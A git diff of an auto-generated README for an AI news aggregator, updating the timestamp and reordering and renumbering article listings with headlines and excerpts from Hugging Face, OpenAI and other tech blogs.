@@ -6,7 +6,7 @@
 
 [![GitHub Profile](https://img.shields.io/badge/GitHub-ThePhoenixAgency-181717?style=for-the-badge&logo=github)](https://github.com/ThePhoenixAgency) [![Repository](https://img.shields.io/badge/Source-Repo-181717?style=for-the-badge&logo=github)](https://github.com/ThePhoenixAgency/AI-Pulse) [![Reader](https://img.shields.io/badge/Live-Reader-blueviolet?style=for-the-badge&logo=readthedocs)](https://thephoenixagency.github.io/AI-Pulse/app.html) [![Documentation](https://img.shields.io/badge/Documentation-Technical-blue?style=for-the-badge&logo=googledocs)](https://github.com/ThePhoenixAgency/AI-Pulse/blob/main/database/SUPABASE_MIGRATION.md) [![Support](https://img.shields.io/badge/Support-Issues-181717?style=for-the-badge&logo=github)](https://github.com/ThePhoenixAgency/AI-Pulse/issues)
 
-**Last Update:** Wed, 18 Feb 2026 20:16:36 GMT
+**Last Update:** Wed, 18 Feb 2026 20:31:21 GMT
 
 ---
 
@@ -414,17 +414,9 @@ Back to Articles Accessing SAIR 1. Install essentials 2. Authenticate 3. Load th
 
 </div>
 
-<div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
-
-### 15. `EN` [Measuring Open-Source Llama Nemotron Models on DeepResearch Bench](data/articles/92e6cf93ec91513708d696cfc86ea6fd.html)
-**Source:** Hugging Face Blog | **Keyword:** `AI`
-Back to Articles Core Stack: Model Choices and Technical Innovations Deep Reasoning with Llama Nemotron Evaluation: Transparency and Robustness in Metrics Benchmark Results: DeepResearch Bench For the Hugging Face Developer Community Takeaways Contributors: David Austin, Raja Biswas, Gilberto Titericz Junior, NVIDIA
-
-</div>
-
 <div class="article-item" data-lang="fr" data-category="ai" data-source="Siecle Digital">
 
-### 16. `FR` [Anthropic lève 30 milliards de dollars et talonne désormais OpenAI](data/articles/5c6142d802f3c02e3762d7873454c28a.html)
+### 15. `FR` [Anthropic lève 30 milliards de dollars et talonne désormais OpenAI](data/articles/5c6142d802f3c02e3762d7873454c28a.html)
 **Source:** Siecle Digital | **Keyword:** `IA`
 La bataille des valorisations dans l’intelligence artificielle franchit un nouveau cap. En effet, dans un communiqué de presse, l’américain Anthropic annonce une valorisation de 380 milliards de dollars à l’issue d’une levée de fonds massive de 30 milliards de dollars. Une opération qui confirme l’emballement des marchés pour les acteurs capables de monétiser l’IA à […]
 
@@ -432,27 +424,36 @@ La bataille des valorisations dans l’intelligence artificielle franchit un nou
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Towards Data Science">
 
-### 17. `EN` [The Machine Learning Lessons I’ve Learned Last Month](data/articles/cf3d8b2df4272d8dee2aa86fcd0220e1.html)
+### 16. `EN` [The Machine Learning Lessons I’ve Learned Last Month](data/articles/cf3d8b2df4272d8dee2aa86fcd0220e1.html)
 **Source:** Towards Data Science | **Keyword:** `AI`
 Delayed January: deadlines, downtimes, and flow times
 
 </div>
 
-<div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
+<div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 18. `EN` [The Future of the Global Open-Source AI Ecosystem: From DeepSeek to AI+](data/articles/74bdaef6b67f320ff6161c79d469de34.html)
-**Source:** Hugging Face Blog | **Keyword:** `AI`
-Back to Articles China's Organic Open Source AI Ecosystem The Established The Normalcy of "DeepSeek Moments" Foundations for the Future Looking Back to Look Forward This is the third and final blog in a three-part series on China's open source community's historical advancements since January 2025's "DeepSeek Moment." The first blog on strategic changes and open artifact growth is available here, and the second blog on architectural and hardware shifts is available here.
-In this third article, we examine paths and trajectories of prominent Chinese AI organizations, and posit future directions for open source.
-For AI researchers and developers contributing to and relying on the open source ecosystem and for policymakers understanding the rapidly changing environment, due to intraorganizational and global community gains, open source is the dominant and popular approach for Chinese AI organizations for the near future. Openly sharing artifacts from models to papers to deployment infrastructure maps to a strategy with the goal of large-scale deployment and integration. China's Organic Open Source AI Ecosystem Having examined strategic and architectural changes since DeepSeek's R1, we get
+### 17. `EN` [Snowflake and OpenAI partner to bring frontier intelligence to enterprise data](data/articles/cb03906252fb90da2e748f65d8fb016c.html)
+**Source:** OpenAI Blog | **Keyword:** `AI`
+OpenAI and Snowflake partner in a $200M agreement to bring frontier intelligence into enterprise data, enabling AI agents and insights directly in Snowflake.
 
 </div>
 
-<div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
+<div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
 
-### 19. `EN` [Snowflake and OpenAI partner to bring frontier intelligence to enterprise data](data/articles/cb03906252fb90da2e748f65d8fb016c.html)
-**Source:** OpenAI Blog | **Keyword:** `AI`
-OpenAI and Snowflake partner in a $200M agreement to bring frontier intelligence into enterprise data, enabling AI agents and insights directly in Snowflake.
+### 18. `EN` [Architectural Choices in China's Open-Source AI Ecosystem: Building Beyond DeepSeek](data/articles/c2236e93c437ab6285f85bacbd57e344.html)
+**Source:** Hugging Face Blog | **Keyword:** `AI`
+Back to Articles Mixture of Experts (MoE) as the Default Choice The Rush for Supremacy by Modality Big Preferences for Small Models More Permissive Open Source Licenses From Model-First to Hardware-First Reconstruction In Progress This is the second blog in a three-part series on China's open source community's historical advancements since January 2025's "DeepSeek Moment." The first blog is available here, and the third blog is available here.
+In this second piece we turn our focus from models to the architectural and hardware choices Chinese companies have made as openness becomes the norm.
+For AI researchers and developers contributing to and relying on the open source ecosystem and for policymakers understanding the rapidly changing environment, architectural preferences, modality diversification, license permissiveness, small model popularity, and growing adoption of Chinese hardware point to leadership strategies across a multitude of paths. DeepSeek R1's own characteristics inspired overlap and competition, and contributed to heavier focus on domestic hardware in China. Mixture of Experts (MoE) as the Default Choice In the past year, leading models from
+
+</div>
+
+<div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
+
+### 19. `EN` [One Year Since the “DeepSeek Moment”](data/articles/0235c23c484ad0b5bad50b080341d27d.html)
+**Source:** Hugging Face Blog | **Keyword:** `AI`
+Back to Articles The Seeds of China’s Organic Open Source AI Ecosystem DeepSeek R1: A Turning Point From DeepSeek to AI+: Strategic Realignmentt Global Reception and Response This is the first blog in a series that will examine China’s open source community’s historical advancements in the past year and its reverberations in shaping the entire ecosystem. Much of 2025’s progress can be traced back to January’s “DeepSeek Moment”, when Hangzhou-based AI company DeepSeek released their R-1 model. The first blog addresses strategic changes and the explosion of new open models and open source players. The second covers architectural and hardware choices largely by Chinese companies made in the wake of a growing open ecosystem, available here. The third analyzes prominent organizations’ trajectories and the future of the global open source ecosystem, available here.
+For AI researchers and developers contributing to and relying on the open source ecosystem and for policymakers understanding the rapidly changing environment, there has never been a better time to build and release open models and artifacts, as proven by the past year’s immense growth catalyzed by DeepSeek. Notably, geopolitics has driven adoption; while models developed in
 
 </div>
 
@@ -544,9 +545,19 @@ Back to Articles The Story Behind the Library The Foundation Years (2020-2021) T
 
 </div>
 
+<div class="article-item" data-lang="nl" data-category="ai" data-source="Hugging Face Blog">
+
+### 28. `EN` [Get your VLM running in 3 simple steps on Intel CPUs](data/articles/4076498c2a777b9b673cd6a4ddc0ac36.html)
+**Source:** Hugging Face Blog | **Keyword:** `AI`
+Back to Articles With the growing capability of large language models (LLMs), a new class of models has emerged: Vision Language Models (VLMs). These models can analyze images and videos to describe scenes, create captions, and answer questions about visual content.
+While running AI models on your own device can be difficult as these models are often computationally demanding, it also offers significant benefits: including improved privacy since your data stays on your machine, and enhanced speed and reliability because you're not dependent on an internet connection or external servers. This is where tools like Optimum Intel and OpenVINO come in, along with a small, efficient model like SmolVLM. In this blog post, we'll walk you through three easy steps to get a VLM running locally, with no expensive hardware or GPUs required (though you can run all the code samples from this blog post on Intel GPUs). Deploy your model with Optimum Small models like SmolVLM are built for low-resource consumption, but they can be further optimized. In this blog post we will see how to optimize your model, to lower memory usage and speedup inference, making it more efficient for deployment on devices with limited resources.
+To follow this tutorial, you need to instal
+
+</div>
+
 <div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
 
-### 28. `EN` [Smol2Operator: Post-Training GUI Agents for Computer Use](data/articles/3a64644c5419c6665bca960445b262df.html)
+### 29. `EN` [Smol2Operator: Post-Training GUI Agents for Computer Use](data/articles/3a64644c5419c6665bca960445b262df.html)
 **Source:** Hugging Face Blog | **Keyword:** `AI`
 Back to Articles TL;DR: This work shows how a lightweight vision–language model can acquire GUI-grounded skills and evolve into an agentic GUI coder. We release all training recipes, data-processing tools, resulting model, demo and datasets to enable full reproducibility and foster further research . Find the collection here. This video demonstrates the model obtained through the recipe described below, executing a task end-to-end. Table of Contents Introduction
 1. Data Transformation and Unified Action Space
@@ -571,7 +582,7 @@ What's Next? Introduction Graphical User Interface (GUI) automation is one of th
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
 
-### 29. `EN` [Fine-tune Any LLM from the Hugging Face Hub with Together AI](data/articles/12060dce30fd7f6c8882ca870577eff5.html)
+### 30. `EN` [Fine-tune Any LLM from the Hugging Face Hub with Together AI](data/articles/12060dce30fd7f6c8882ca870577eff5.html)
 **Source:** Hugging Face Blog | **Keyword:** `AI`
 Back to Articles Getting Started in 5 Minutes How It Works: What This Means for Developers How Teams Are Using This Feature? Show Us What You Build! The pace of AI development today is breathtaking. Every single day, hundreds of new models appear on the Hugging Face Hub, some are specialized variants of popular base models like Llama or Qwen, others feature novel architectures or have been trained from scratch for specific domains. Whether it's a medical AI trained on clinical data, a coding assistant optimized for a particular programming language, or a multilingual model fine-tuned for specific cultural contexts, the Hugging Face Hub has become the beating heart of open-source AI innovation.
 But here's the challenge: finding an amazing model is just the beginning. What happens when you discover a model that's 90% perfect for your use case, but you need that extra 10% of customization? Traditional fine-tuning infrastructure is complex, expensive, and often requires significant DevOps expertise to set up and maintain.
@@ -581,7 +592,7 @@ This is exactly the gap that Together AI and Hugging Face are bridging today. We
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
 
-### 30. `EN` [Kimina-Prover-RL](data/articles/b41b550c30c6e72e6c9fb66a9fd77079.html)
+### 31. `EN` [Kimina-Prover-RL](data/articles/b41b550c30c6e72e6c9fb66a9fd77079.html)
 **Source:** Hugging Face Blog | **Keyword:** `AI`
 Back to Articles A slimmed-down training pipeline from Kimina Prover, with core features and full compatibility with verl. We are happy to introduce kimina-prover-rl, an open-source training pipeline for formal theorem proving in Lean 4, based on a structured reasoning-then-generation paradigm inspired by DeepSeek-R1.
 This training pipelinee is a simplified version of the system we used to train Kimina Prover, preserving the key components of the system and offering full compatibility with the open-source Verl framework.
@@ -593,15 +604,15 @@ AI-MO/Kimina-Prover-RL
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
 
-### 31. `EN` [Introducing AI Sheets: a tool to work with datasets using open AI models!](data/articles/6848a3bee3f7efc39d599bf305ea681a.html)
+### 32. `EN` [Measuring Open-Source Llama Nemotron Models on DeepResearch Bench](data/articles/92e6cf93ec91513708d696cfc86ea6fd.html)
 **Source:** Hugging Face Blog | **Keyword:** `AI`
-The Wayback Machine is an initiative of the Internet Archive, a 501(c)(3) non-profit, building a digital library of Internet sites and other cultural artifacts in digital form. Other projects include Open Library &amp; archive-it.org. Your use of the Wayback Machine is subject to the Internet Archive's Terms of Use.
+Measuring Open-Source Llama Nemotron Models on DeepResearch Bench
 
 </div>
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Towards Data Science">
 
-### 32. `EN` [Use OpenClaw to Make a Personal AI Assistant](data/articles/174de6f3183338e6a5a91689cf359c10.html)
+### 33. `EN` [Use OpenClaw to Make a Personal AI Assistant](data/articles/174de6f3183338e6a5a91689cf359c10.html)
 **Source:** Towards Data Science | **Keyword:** `AI`
 Learn how to set up OpenClaw as a personalized AI agent
 
@@ -609,7 +620,7 @@ Learn how to set up OpenClaw as a personalized AI agent
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Towards Data Science">
 
-### 33. `EN` [Why Every Analytics Engineer Needs to Understand Data Architecture](data/articles/6827b04d6bbdf33213838b491a59c184.html)
+### 34. `EN` [Why Every Analytics Engineer Needs to Understand Data Architecture](data/articles/6827b04d6bbdf33213838b491a59c184.html)
 **Source:** Towards Data Science | **Keyword:** `AI`
 Get the data architecture right, and everything else becomes easier.
 I know it sounds simple, but in reality, little nuances in designing your data architecture may have costly implications.
@@ -618,7 +629,7 @@ I know it sounds simple, but in reality, little nuances in designing your data a
 
 <div class="article-item" data-lang="fr" data-category="ai" data-source="Siecle Digital">
 
-### 34. `FR` [INESIA : la France se dote d’un nouveau bouclier pour encadrer les IA avancées](data/articles/382ff2e2304e580bfe7d1fe717e6465b.html)
+### 35. `FR` [INESIA : la France se dote d’un nouveau bouclier pour encadrer les IA avancées](data/articles/382ff2e2304e580bfe7d1fe717e6465b.html)
 **Source:** Siecle Digital | **Keyword:** `IA`
 La France poursuit la structuration de son écosystème autour de l’intelligence artificielle. En effet, l’INESIA (Institut National pour l’Evaluation et la Sécurité de l’IA) vient d’adopter sa feuille de route pour la période 2026-2027. Derrière ce document stratégique, l’ambition est de bâtir une capacité nationale d’évaluation des systèmes d’IA avancés, dans une logique de souveraineté […]
 
@@ -626,7 +637,7 @@ La France poursuit la structuration de son écosystème autour de l’intelligen
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Towards Data Science">
 
-### 35. `EN` [A beginner’s guide to Tmux: a multitasking superpower for your terminal](data/articles/df8cf0add1cc666fe3e0467e91043e5a.html)
+### 36. `EN` [A beginner’s guide to Tmux: a multitasking superpower for your terminal](data/articles/df8cf0add1cc666fe3e0467e91043e5a.html)
 **Source:** Towards Data Science | **Keyword:** `AI`
 One of the new things I’ve come across recently, while researching command-line-based coding assistants, is the mention and use of a tool I hadn’t heard of before. That tool is called Tmux, which stands for Terminal Multiplexer. In the simplest possible terms, Tmux allows you to split up a single terminal window into a number […]
 
@@ -634,7 +645,7 @@ One of the new things I’ve come across recently, while researching command-lin
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Towards Data Science">
 
-### 36. `EN` [Your First 90 Days as a Data Scientist](data/articles/8339fa0fb024c73b68717960ccb263aa.html)
+### 37. `EN` [Your First 90 Days as a Data Scientist](data/articles/8339fa0fb024c73b68717960ccb263aa.html)
 **Source:** Towards Data Science | **Keyword:** `AI`
 A practical onboarding checklist for building trust, business fluency, and data intuition
 
@@ -642,7 +653,7 @@ A practical onboarding checklist for building trust, business fluency, and data 
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Towards Data Science">
 
-### 37. `EN` [How to Leverage Explainable AI for Better Business Decisions](data/articles/e22171a27e9c4fdece7d5e93d388185d.html)
+### 38. `EN` [How to Leverage Explainable AI for Better Business Decisions](data/articles/e22171a27e9c4fdece7d5e93d388185d.html)
 **Source:** Towards Data Science | **Keyword:** `AI`
 Moving beyond the black box to turn complex model outputs into actionable organizational strategies.
 
@@ -650,7 +661,7 @@ Moving beyond the black box to turn complex model outputs into actionable organi
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
 
-### 38. `EN` [OpenEnv in Practice: Evaluating Tool-Using Agents in Real-World Environments](data/articles/a09280a19158c371ffe917883d12d42c.html)
+### 39. `EN` [OpenEnv in Practice: Evaluating Tool-Using Agents in Real-World Environments](data/articles/a09280a19158c371ffe917883d12d42c.html)
 **Source:** Hugging Face Blog | **Keyword:** `AI`
 Back to Articles What Is OpenEnv? The Calendar Gym: A Production-Grade Benchmark What We Learned Looking Ahead Appendix: Common error cases in tool use Specific error cases found in the wild AI agents often perform impressively in controlled research settings, yet struggle when deployed in real-world systems where they must reason across multiple steps, interact with real tools and APIs, operate under partial information, and recover from errors in stateful, permissioned environments—highlighting a persistent gap between research success and production reliability.
 OpenEnv is an open-source framework from Meta and Hugging Face designed to address this challenge by standardizing how agents interact with real environments. As part of this collaboration, Turing contributed a production-grade calendar management environment to study tool-using agents under realistic constraints such as access control, temporal reasoning, and multi-agent coordination.
@@ -660,7 +671,7 @@ In this post, we explore how OpenEnv works in practice, why calendars serve as a
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
 
-### 39. `EN` [Introducing SyGra Studio](data/articles/4b956a170e779a88bfa5657dd6178350.html)
+### 40. `EN` [Introducing SyGra Studio](data/articles/4b956a170e779a88bfa5657dd6178350.html)
 **Source:** Hugging Face Blog | **Keyword:** `AI`
 Back to Articles Step 1: Configure the data source Step 2: Build the flow visually Step 3: Review and run See it in action! Running Existing Workflows Run the Glaive Code Assistant workflow Get started SyGra 2.0.0 introduces Studio, an interactive environment that turns synthetic data generation into a transparent, visual craft. Instead of juggling YAML files and terminals, you compose flows directly on the canvas, preview datasets before committing, tune prompts with inline variable hints, and watch executions stream live—all from a single pane. Under the hood it’s the same platform, so everything you do visually generates the corresponding SyGra compatible graph config and task executor scripts. What Studio lets you do Configure and validate models with guided forms (OpenAI, Azure OpenAI, Ollama, Vertex, Bedrock, vLLM, custom endpoints).
 Connect Hugging Face, file-system, or ServiceNow data sources and preview rows before execution.
@@ -669,9 +680,17 @@ Design downstream outputs using shared state variables a
 
 </div>
 
+<div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
+
+### 41. `EN` [The Future of the Global Open-Source AI Ecosystem: From DeepSeek to AI+](data/articles/74bdaef6b67f320ff6161c79d469de34.html)
+**Source:** Hugging Face Blog | **Keyword:** `AI`
+The Future of the Global Open-Source AI Ecosystem: From DeepSeek to AI+
+
+</div>
+
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 40. `EN` [Taisei Corporation shapes the next generation of talent with ChatGPT](data/articles/db33a82befb3747ac5311964fffccf19.html)
+### 42. `EN` [Taisei Corporation shapes the next generation of talent with ChatGPT](data/articles/db33a82befb3747ac5311964fffccf19.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 Taisei Corporation uses ChatGPT Enterprise to support HR-led talent development and scale generative AI across its global construction business.
 
@@ -679,23 +698,15 @@ Taisei Corporation uses ChatGPT Enterprise to support HR-led talent development 
 
 <div class="article-item" data-lang="nl" data-category="ai" data-source="Hugging Face Blog">
 
-### 41. `EN` [We Got Claude to Build CUDA Kernels and teach open models!](data/articles/419cdcf844282d47cb9508b7897864c6.html)
+### 43. `EN` [We Got Claude to Build CUDA Kernels and teach open models!](data/articles/419cdcf844282d47cb9508b7897864c6.html)
 **Source:** Hugging Face Blog | **Keyword:** `AI`
 Back to Articles What are agent skills? 1. Get the teacher (Claude Opus 4.5) to build a kernel 2. Make an agent skill from the trace 3. Take your skill to an open source, smaller, or cheaper model Deep dive tutorial into building kernels with agent skills Setup and Install Skill Generation Generate the Skill Evaluate on a Different Model How the evaluation in upskill works What's Next Resources The best thing about agent skills is upskilling your agents on hard problems. There are two ways to look at that: You can take Opus 4.5 or other SOTA models and tackle the hardest problems out there. You can take models that run on your laptop and upskill them to harder problems. In this blog post, we’ll show you how to take on the latter. This blog post walks through the process of using a new tool, upskill, to generate and evaluate agent skills with large models and use them with smaller models. We will benchmark upskill on the task of writing CUDA kernels for diffusers models, but the process is generally useful for cutting costs, or using smaller models
 
 </div>
 
-<div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
-
-### 42. `EN` [Architectural Choices in China's Open-Source AI Ecosystem: Building Beyond DeepSeek](data/articles/c2236e93c437ab6285f85bacbd57e344.html)
-**Source:** Hugging Face Blog | **Keyword:** `AI`
-Architectural Choices in China's Open-Source AI Ecosystem: Building Beyond DeepSeek
-
-</div>
-
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 43. `EN` [Inside GPT-5 for Work: How Businesses Use GPT-5](data/articles/806619e99a4c4e563424e7c69c91cf01.html)
+### 44. `EN` [Inside GPT-5 for Work: How Businesses Use GPT-5](data/articles/806619e99a4c4e563424e7c69c91cf01.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 A data-driven report on how workers across industries use ChatGPT—covering adoption trends, top tasks, departmental patterns, and the future of AI at work.
 
@@ -703,7 +714,7 @@ A data-driven report on how workers across industries use ChatGPT—covering ado
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 44. `EN` [Investing in Merge Labs](data/articles/dbf80c81a6d49ad3987f0c03b0065db8.html)
+### 45. `EN` [Investing in Merge Labs](data/articles/dbf80c81a6d49ad3987f0c03b0065db8.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 OpenAI is investing in Merge Labs to support new brain computer interfaces that bridge biological and artificial intelligence to maximize human ability, agency, and experience.
 
@@ -711,7 +722,7 @@ OpenAI is investing in Merge Labs to support new brain computer interfaces that 
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 45. `EN` [Deepening our collaboration with the U.S. Department of Energy](data/articles/82b7c58417005030afd16376120ff3c1.html)
+### 46. `EN` [Deepening our collaboration with the U.S. Department of Energy](data/articles/82b7c58417005030afd16376120ff3c1.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 OpenAI and the U.S. Department of Energy have signed a memorandum of understanding to deepen collaboration on AI and advanced computing in support of scientific discovery. The agreement builds on ongoing work with national laboratories and helps establish a framework for applying AI to high-impact research across the DOE ecosystem.
 
@@ -719,7 +730,7 @@ OpenAI and the U.S. Department of Energy have signed a memorandum of understandi
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
 
-### 46. `EN` [The Open Evaluation Standard: Benchmarking NVIDIA Nemotron 3 Nano with NeMo Evaluator](data/articles/c1fd5fcd7f1c01ccaf2db310506edfdb.html)
+### 47. `EN` [The Open Evaluation Standard: Benchmarking NVIDIA Nemotron 3 Nano with NeMo Evaluator](data/articles/c1fd5fcd7f1c01ccaf2db310506edfdb.html)
 **Source:** Hugging Face Blog | **Keyword:** `AI`
 Back to Articles It has become increasingly challenging to assess whether a model’s
 reported improvements reflect genuine advances or variations in
@@ -748,7 +759,7 @@ more intelligent or si
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 47. `EN` [Evaluating AI’s ability to perform scientific research tasks](data/articles/005a369e5985367628f799abb8d48877.html)
+### 48. `EN` [Evaluating AI’s ability to perform scientific research tasks](data/articles/005a369e5985367628f799abb8d48877.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 OpenAI introduces FrontierScience, a benchmark testing AI reasoning in physics, chemistry, and biology to measure progress toward real scientific research.
 
@@ -756,7 +767,7 @@ OpenAI introduces FrontierScience, a benchmark testing AI reasoning in physics, 
 
 <div class="article-item" data-lang="fr" data-category="ai" data-source="Hugging Face Blog">
 
-### 48. `FR` [CUGA on Hugging Face: Democratizing Configurable AI Agents](data/articles/ff468cdfcbd0ef94f8e08fcc68d8a36e.html)
+### 49. `FR` [CUGA on Hugging Face: Democratizing Configurable AI Agents](data/articles/ff468cdfcbd0ef94f8e08fcc68d8a36e.html)
 **Source:** Hugging Face Blog | **Keyword:** `IA`
 Back to Articles Introduction Introduction What is CUGA? Open Source and Open Models Integration with Langflow: Visual Agent Design Made Simple Try the Hugging Face Demo: A Hands-On Preview Conclusion and Call to Action AI agents are rapidly becoming essential for building intelligent applications, but creating robust, adaptable agents that scale across domains remains a challenge. Many existing frameworks struggle with brittleness, tool misuse, and failures when faced with complex workflows.
 CUGA (Configurable Generalist Agent) was designed to overcome these limitations. It's an open-source, AI Agent that combines flexibility, reliability, and ease of use for enterprise use cases. By abstracting orchestration complexity, CUGA empowers developers to focus on domain requirements rather than the internals of agent building. And now, with its integration into Hugging Face Spaces, experimenting with CUGA and open models has never been easier. What is CUGA? CUGA is a configurable, general-purpose AI agent that supports complex, multi-step tasks across web and API environments. It has achieved state-of-the-art performance on leadin
@@ -765,7 +776,7 @@ CUGA (Configurable Generalist Agent) was designed to overcome these limitations.
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 49. `EN` [Advancing science and math with GPT-5.2](data/articles/a0761fcba5c5f0d202d9458c532ed9e0.html)
+### 50. `EN` [Advancing science and math with GPT-5.2](data/articles/a0761fcba5c5f0d202d9458c532ed9e0.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 GPT-5.2 is OpenAI’s strongest model yet for math and science, setting new state-of-the-art results on benchmarks like GPQA Diamond and FrontierMath. This post shows how those gains translate into real research progress, including solving an open theoretical problem and generating reliable mathematical proofs.
 
@@ -773,7 +784,7 @@ GPT-5.2 is OpenAI’s strongest model yet for math and science, setting new stat
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 50. `EN` [Update to GPT-5 System Card: GPT-5.2](data/articles/3a08ce45b2507e0cd0772031df0ab83c.html)
+### 51. `EN` [Update to GPT-5 System Card: GPT-5.2](data/articles/3a08ce45b2507e0cd0772031df0ab83c.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 GPT-5.2 is the latest model family in the GPT-5 series. The comprehensive safety mitigation approach for these models is largely the same as that described in the GPT-5 System Card and GPT-5.1 System Card. Like OpenAI’s other models, the GPT-5.2 models were trained on diverse datasets, including information that is publicly available on the internet, information that we partner with third parties to access, and information that our users or human trainers and researchers provide or generate.
 
@@ -781,7 +792,7 @@ GPT-5.2 is the latest model family in the GPT-5 series. The comprehensive safety
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 51. `EN` [OpenAI appoints Denise Dresser as Chief Revenue Officer](data/articles/5a44359b6a9ce7aa56cd23986618bf83.html)
+### 52. `EN` [OpenAI appoints Denise Dresser as Chief Revenue Officer](data/articles/5a44359b6a9ce7aa56cd23986618bf83.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 Denise Dresser is joining as Chief Revenue Officer, overseeing OpenAI’s global revenue strategy across enterprise and customer success. She will help more businesses put AI to work in their day-to-day operations as OpenAI continues to scale.
 
@@ -789,7 +800,7 @@ Denise Dresser is joining as Chief Revenue Officer, overseeing OpenAI’s global
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 52. `EN` [Bringing powerful AI to millions across Europe with Deutsche Telekom](data/articles/4177e56511df85dfc91b5fcab2b5645b.html)
+### 53. `EN` [Bringing powerful AI to millions across Europe with Deutsche Telekom](data/articles/4177e56511df85dfc91b5fcab2b5645b.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 OpenAI is collaborating with Deutsche Telekom to bring advanced, multilingual AI experiences to millions of people across Europe. ChatGPT Enterprise will also be deployed to help employees at Deutsche Telekom improve workflows and accelerate innovation.
 
@@ -797,7 +808,7 @@ OpenAI is collaborating with Deutsche Telekom to bring advanced, multilingual AI
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 53. `EN` [OpenAI to acquire Neptune](data/articles/07086e73bc037c6565aaaff87c9c19e3.html)
+### 54. `EN` [OpenAI to acquire Neptune](data/articles/07086e73bc037c6565aaaff87c9c19e3.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 OpenAI is acquiring Neptune to deepen visibility into model behavior and strengthen the tools researchers use to track experiments and monitor training.
 
@@ -805,7 +816,7 @@ OpenAI is acquiring Neptune to deepen visibility into model behavior and strengt
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 54. `EN` [Accenture and OpenAI accelerate enterprise AI success](data/articles/efc2132fd740754392307a254df17fb8.html)
+### 55. `EN` [Accenture and OpenAI accelerate enterprise AI success](data/articles/efc2132fd740754392307a254df17fb8.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 Accenture and OpenAI are collaborating to help enterprises bring agentic AI capabilities into the core of their business and unlock new levels of growth.
 
@@ -813,7 +824,7 @@ Accenture and OpenAI are collaborating to help enterprises bring agentic AI capa
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 55. `EN` [Mixpanel security incident: what OpenAI users need to know](data/articles/8dd9bb0697e2908dd121f4607aa9269b.html)
+### 56. `EN` [Mixpanel security incident: what OpenAI users need to know](data/articles/8dd9bb0697e2908dd121f4607aa9269b.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 OpenAI shares details about a Mixpanel security incident involving limited API analytics data. No API content, credentials, or payment details were exposed. Learn what happened and how we’re protecting users.
 
@@ -821,7 +832,7 @@ OpenAI shares details about a Mixpanel security incident involving limited API a
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 56. `EN` [Early experiments in accelerating science with GPT-5](data/articles/0c40a000ff645391fcc87c00e55a58bd.html)
+### 57. `EN` [Early experiments in accelerating science with GPT-5](data/articles/0c40a000ff645391fcc87c00e55a58bd.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 OpenAI introduces the first research cases showing how GPT-5 accelerates scientific progress across math, physics, biology, and computer science. Explore how AI and researchers collaborate to generate proofs, uncover new insights, and reshape the pace of discovery.
 
@@ -829,7 +840,7 @@ OpenAI introduces the first research cases showing how GPT-5 accelerates scienti
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 57. `EN` [How Scania is accelerating work with AI across its global workforce](data/articles/17045c091cb6e6fcb5f6a7f519b1245e.html)
+### 58. `EN` [How Scania is accelerating work with AI across its global workforce](data/articles/17045c091cb6e6fcb5f6a7f519b1245e.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 Description: Global manufacturer Scania is scaling AI with ChatGPT Enterprise. With team-based onboarding and strong guardrails, AI is boosting productivity, quality, and innovation.
 
@@ -837,7 +848,7 @@ Description: Global manufacturer Scania is scaling AI with ChatGPT Enterprise. W
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 58. `EN` [OpenAI named Emerging Leader in Generative AI](data/articles/0ee69ec84e3309ca88e2a257f13122c4.html)
